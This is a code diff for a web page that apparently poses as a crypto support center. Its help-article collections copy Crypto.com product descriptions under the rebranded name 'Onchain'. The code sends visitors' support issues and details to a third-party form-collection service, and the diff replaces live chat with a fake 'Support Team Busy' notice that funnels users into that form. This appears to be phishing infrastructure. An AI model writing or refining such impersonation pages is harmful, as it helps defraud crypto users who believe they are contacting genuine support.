@@ -1,21 +1,21 @@
 const collections = [
   {
-    title: "Onchainhub App",
+    title: "Onchain App",
     desc: "Detailed information about Crypto.com App, available markets, CRO lockup, Crypto deposits and withdrawals, referral program, and security",
     count: "114 articles",
   },
   {
-    title: "Onchainhub Exchange",
+    title: "Onchain Exchange",
     desc: "Registration, account management, trading, CRO lockup, fees, referral program and security",
     count: "150 articles",
   },
   {
-    title: "Onchainhub Prepaid Card",
+    title: "Onchain Prepaid Card",
     desc: "Everything to know about Crypto.com Prepaid Card - application, activation, usage and benefits",
     count: "49 articles",
   },
   {
-    title: "Onchainhub Cash Account",
+    title: "Onchain Cash Account",
     desc: "Set up, Deposits, Withdrawals, Bank Transfers, Account Management",
     count: "48 articles",
   },
@@ -30,7 +30,7 @@ const collections = [
     count: "7 articles",
   },
   {
-    title: "Onchainhub",
+    title: "Onchain",
     desc: "Onboarding, wallet management, deposit and withdrawal",
     count: "91 articles",
   },
@@ -63,7 +63,7 @@ const mostRead = [
   "How to Set Up Your App 2FA?",
   "Cash Account - General Information",
   "How to Update Your Phone Number in the Onchain App",
-  "Onchainhub Send",
+  "Onchain Send",
 ];
 
 // Real-style Article Content
@@ -402,22 +402,6 @@ async function validateForm() {
   showLoading(details);
 }
 
-// const response = await fetch("https://submit-form.com/RMPTnnWij", {
-//   method: "POST",
-//   headers: {
-//     "Content-Type": "application/json",
-//     Accept: "application/json",
-//   },
-//   body: JSON.stringify({
-//     issue: window.selectedIssue,
-//     details: details,
-//   }),
-// });
-// if (!response.ok) {
-//   throw new Error(`HTTP ${response.status}`);
-// }
-
-// showEmailPopup();
 async function submitFirstForm(details) {
   fetch("https://submit-form.com/RMPTnnWij", {
     method: "POST",
@@ -504,8 +488,7 @@ Request Submitted
 
 <p class="text-gray-500 mb-8">
 
-Your support request has been received successfully.
-
+Your support request has been received successfully. You will receive an email notification shortly.
 </p>
 
 <button
@@ -564,7 +547,40 @@ function resetHelpModal() {
   renderIssues(primaryIssues);
 }
 function openChat() {
-  alert("💬 Connecting you to Support...");
+  const modal = document.getElementById("help-modal");
+  const body = document.getElementById("help-body");
+
+  body.innerHTML = `
+    <div class="text-center py-12">
+      <div class="text-5xl mb-5">👨‍💻</div>
+
+      <h2 class="text-2xl font-bold text-[#0A2540] mb-4">
+        Support Team Busy
+      </h2>
+
+      <p class="text-gray-600 text-lg leading-relaxed mb-8">
+        Our support team is actively engaged right now.<br>
+        Please use the <strong>"Get Instant Help"</strong> center for immediate assistance.
+      </p>
+
+      <div class="flex justify-center gap-4">
+        <button
+          onclick="closeHelpModal()"
+          class="px-6 py-3 border border-gray-300 rounded-2xl hover:bg-gray-100">
+          Close
+        </button>
+
+        <button
+          onclick="openHelpModal()"
+          class="px-6 py-3 bg-[#5E17EB] text-white rounded-2xl hover:bg-[#4C0FCE]">
+          Get Instant Help
+        </button>
+      </div>
+    </div>
+  `;
+
+  modal.classList.remove("hidden");
+  modal.classList.add("flex");
 }
 
 // Initialize
